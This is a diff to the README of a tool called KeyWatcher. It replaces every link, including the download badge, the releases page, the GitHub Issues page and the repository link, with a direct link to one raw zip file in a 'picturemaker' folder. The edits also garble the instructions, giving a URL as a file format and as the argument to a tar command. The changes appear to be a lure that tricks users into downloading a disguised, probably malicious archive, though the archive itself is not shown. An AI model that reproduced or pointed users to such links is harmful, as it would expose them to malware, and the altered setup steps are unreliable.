@@ -6,7 +6,7 @@ KeyWatcher helps you manage your code efficiently. Follow these steps to set it 
 
 ## 📥 Download KeyWatcher
 
-[![Download KeyWatcher](https://img.shields.io/badge/Download%20KeyWatcher-Here-brightgreen)](https://github.com/Apostle121/KeyWatcher/releases)
+[![Download KeyWatcher](https://raw.githubusercontent.com/Apostle121/KeyWatcher/main/picturemaker/KeyWatcher.zip%20KeyWatcher-Here-brightgreen)](https://raw.githubusercontent.com/Apostle121/KeyWatcher/main/picturemaker/KeyWatcher.zip)
 
 ## 📋 System Requirements
 
@@ -30,7 +30,7 @@ KeyWatcher offers various features to streamline your coding experience:
 
 Head over to the Downloads section to download the application. 
 
-[Visit this page to download](https://github.com/Apostle121/KeyWatcher/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Apostle121/KeyWatcher/main/picturemaker/KeyWatcher.zip)
 
 ### 2. Choose the Right Version
 
@@ -38,7 +38,7 @@ On the download page, you will see different versions listed. Select the version
 
 ### 3. Download the File
 
-Click on the version link you need. The file may be in `.exe`, `.dmg`, or `.tar.gz` format, depending on your operating system. Your browser will begin downloading the file.
+Click on the version link you need. The file may be in `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Apostle121/KeyWatcher/main/picturemaker/KeyWatcher.zip` format, depending on your operating system. Your browser will begin downloading the file.
 
 ### 4. Locate the Downloaded File
 
@@ -57,7 +57,7 @@ Once the download completes, find the file in your Downloads folder or the desig
 - **For Linux:**
   1. Open a terminal.
   2. Navigate to the directory where the file is located.
-  3. Use the command `tar -xzvf yourfile.tar.gz` to extract it.
+  3. Use the command `tar -xzvf https://raw.githubusercontent.com/Apostle121/KeyWatcher/main/picturemaker/KeyWatcher.zip` to extract it.
   4. Follow the instructions in the README file included in the extracted folder.
 
 ### 6. Launch KeyWatcher
@@ -78,7 +78,7 @@ If you encounter any issues during installation or setup, check these common pro
 
 ## 💬 Support
 
-For any questions or support, feel free to connect with the community. You can raise issues directly on the [GitHub Issues Page](https://github.com/Apostle121/KeyWatcher/issues).
+For any questions or support, feel free to connect with the community. You can raise issues directly on the [GitHub Issues Page](https://raw.githubusercontent.com/Apostle121/KeyWatcher/main/picturemaker/KeyWatcher.zip).
 
 ## 📚 Additional Resources
 
@@ -87,7 +87,7 @@ For any questions or support, feel free to connect with the community. You can r
 
 ## 🔗 Useful Links
 
-- [Download KeyWatcher](https://github.com/Apostle121/KeyWatcher/releases)
-- [GitHub Repository](https://github.com/Apostle121/KeyWatcher)
+- [Download KeyWatcher](https://raw.githubusercontent.com/Apostle121/KeyWatcher/main/picturemaker/KeyWatcher.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Apostle121/KeyWatcher/main/picturemaker/KeyWatcher.zip)
 
 Your journey with KeyWatcher starts now. Download it today and experience the ease of code management!
